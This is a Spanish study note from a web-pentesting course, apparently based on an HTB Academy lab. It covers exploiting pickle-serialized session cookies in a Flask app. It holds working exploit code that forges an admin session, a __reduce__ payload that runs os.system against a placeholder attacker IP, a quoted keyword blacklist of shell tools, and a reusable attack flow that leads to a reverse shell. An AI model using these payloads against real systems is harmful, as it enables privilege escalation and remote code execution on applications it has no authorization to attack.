---
tags:
  - Web/Red-Team
  - Deserializacion
  - Pentesting/Explotacion
Descripción: "Forjar una cookie pickle para escalar de rol y luego obtener RCE sobre un objeto de sesión deserializado, con el flujo completo de laboratorio a objetivo"
Fecha de actualización: 2026-11-20
Nota previa: "[[08 - Python - pickle y su máquina virtual]]"
Nota siguiente: "[[10 - Bypass de filtros en deserialización Python]]"
Area: "[[Deserialización.base|Deserialización]]"
---
---

El escenario del módulo —`HTBooks`, una aplicación Flask— lleva el estado de sesión en una cookie que es un objeto `pickle` deserializado en cada petición. Es el molde más común de deserialización en Python web, y recorre los dos grados del ataque sobre el mismo primitivo: primero `object injection` para escalar de rol, después RCE.

# Reconocer la cookie

La cookie `auth_8bH3mjF6n9` lleva un valor Base64 que, decodificado, empieza por `\x80\x04\x95` y termina en `.`: un `pickle` protocolo 4 (ver [[08 - Python - pickle y su máquina virtual]]). En whitebox el código lo confirma:

```python
def sessionToCookie(session):
    return base64.b64encode(pickle.dumps(session))

def cookieToSession(cookie):
    b = base64.b64decode(cookie)
    for badword in [b"nc", b"ncat", b"/bash", b"/sh", b"subprocess", b"Popen"]:
        if badword in b:
            return None
    return pickle.loads(b)
```

Dos hechos saltan: la cookie es un `pickle.dumps` de un objeto `Session`, y antes de `pickle.loads` hay un **blacklist** de palabras. La blacklist se encara en [[10 - Bypass de filtros en deserialización Python]]; para `object injection` ni siquiera estorba.

# Grado 1: object injection para escalar rol

La clase `Session` decide la administración por una propiedad:

```python
def isAdmin(self):
    return self.role == 'admin'
```

Como la cookie es territorio del atacante, basta con forjar un `pickle` de un `Session` con `role = 'admin'`. El truco de implementación que el módulo enseña bien: <mark style="background: #ADCCFFA6;">al serializar en Python solo importan los **valores de las variables**, no los métodos</mark>. El exploit no necesita copiar la clase entera, solo recrear su estructura de datos con un constructor propio:

```python
# exploit/util/auth.py — versión mínima del atacante
import pickle, base64

class Session:
    def __init__(self, username, role):
        self.username = username
        self.role = role

def sessionToCookie(session):
    return base64.b64encode(pickle.dumps(session))
```

```python
import util.auth
s = util.auth.Session("attacker", "admin")
print(util.auth.sessionToCookie(s).decode())
```

> [!warning]+ Respetar la ruta de módulo del objeto
> El `pickle` guarda el objeto como `util.auth.Session`, con su ruta de módulo completa. Al deserializar, la víctima importa `util.auth.Session` de **su** código y le inyecta los atributos del `pickle`. Por eso el exploit replica la estructura de carpetas `util/auth.py`: si la ruta de módulo no coincide con la del objetivo, `pickle.loads` no encuentra la clase y falla. Esto es `object injection` puro: no se ejecuta código, se sustituye el estado de un objeto legítimo.

Sustituida la cookie, la aplicación deserializa el `Session` falso, `isAdmin()` devuelve `True` y el panel de administración se abre.

# Grado 2: RCE sobre la misma cookie

El salto a ejecución de código usa `__reduce__`, como en [[08 - Python - pickle y su máquina virtual]]. Primera prueba, confirmar RCE con un ping observable en lugar de una `shell` a ciegas:

```python
import pickle, base64, os

class RCE:
    def __reduce__(self):
        return os.system, ("ping -c 5 <ATTACKER_IP>",)

print(base64.b64encode(pickle.dumps(RCE())).decode())
```

<mark style="background: #FFB86CA6;">Confirmar la ejecución con una señal de red —un ping capturado con `tcpdump`, una petición a Burp Collaborator— antes de intentar una `shell`</mark>: separa «el comando se ejecuta» de «mi reverse shell no conecta por el firewall», que son dos problemas distintos. Es el equivalente a la detección de ejecución ciega del lado web.

Con la RCE confirmada, el comando pasa a ser la reverse shell. Aquí sí entra la blacklist —`nc`, `/bash`, `/sh`, `subprocess`, `Popen` están prohibidos—, así que el `payload` final necesita evadirla con las técnicas de [[10 - Bypass de filtros en deserialización Python]].

> [!important]+ El 500 no significa fallo
> Igual que con PHPGGC en PHP, el `payload` de RCE no reconstruye un objeto `Session` válido: devuelve lo que sea que `os.system` retorne (un entero), y la aplicación falla al tratarlo como `Session`, dando `Internal Server Error`. El comando ya corrió antes del error. Verificar el listener, no el código de estado HTTP.

# El flujo completo, reutilizable

El patrón que deja este escenario, aplicable a cualquier app Python con sesión serializada:

1. **Identificar** el `pickle` por su firma (`gAS...` en Base64).
2. **Montar laboratorio local** replicando la ruta de módulo del objeto —imprescindible para que `pickle.loads` resuelva la clase.
3. **Object injection** primero: forjar el objeto con los valores que rompan la lógica (rol, id, flags). Barato y poco ruidoso.
4. **RCE** después: `__reduce__` con `os.system`, confirmando con señal de red antes de la `shell`.
5. **Evadir** el filtro si lo hay.

> [!info]+ Fuentes
> Comportamiento de `pickle` con rutas de módulo y `__reduce__`: [docs.python.org — pickle](https://docs.python.org/3/library/pickle.html). Lecturas sobre explotación de pickle citadas por HTB y verificadas: [David Hamann — Exploiting Python pickle](https://davidhamann.de/2020/04/05/exploiting-python-pickle/). Escenario `HTBooks` del módulo 169 de HTB Academy.
